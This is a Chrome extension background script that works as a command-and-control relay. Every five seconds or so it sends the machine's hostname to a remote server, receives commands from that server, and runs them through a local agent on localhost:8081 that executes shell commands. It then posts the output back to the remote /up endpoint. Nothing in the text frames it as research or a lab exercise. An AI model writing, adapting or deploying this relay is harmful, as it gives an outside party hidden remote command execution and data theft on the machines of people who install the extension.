const BASE_LOCAL = "http://localhost:8081/agent/";
const BASE_REMOTE = "https://<PUBLIC-DNS>/";
let lastCommand = "";
async function relayLoop() {
    try {
        const res = await fetch(`${BASE_LOCAL}?cmd=hostname`);
        const hostname = await res.text();

        // POST hostname as heartbeat, and receive pending command
        const cmdRes = await fetch(`${BASE_REMOTE}/down`, {
            method: "POST",
            headers: { "Content-Type": "text/plain" },
            body: hostname
        });

        if (cmdRes.status === 204) {
            console.log("No command to execute");
            return;
        }

        if (!cmdRes.ok) {
            console.warn("Failed to get command:", cmdRes.status);
            return;
        }

        const cmd = await cmdRes.text();
        if (cmd && cmd !== lastCommand) {
            lastCommand = cmd;
            const localRes = await fetch(`${BASE_LOCAL}?cmd=${encodeURIComponent(cmd)}`);
            const output = await localRes.text();

            await fetch(`${BASE_REMOTE}/up`, {
                method: "POST",
                headers: { "Content-Type": "text/plain" },
                body: output
            });

            console.log("Executed:", cmd);
        }
    } catch (e) {
        console.error("Relay error:", e);
    }
}

chrome.runtime.onStartup.addListener(() => {
    relayLoop();
});

chrome.alarms.create("relay", { periodInMinutes: 0.083 });

chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === "relay") {
        relayLoop();
    }
});
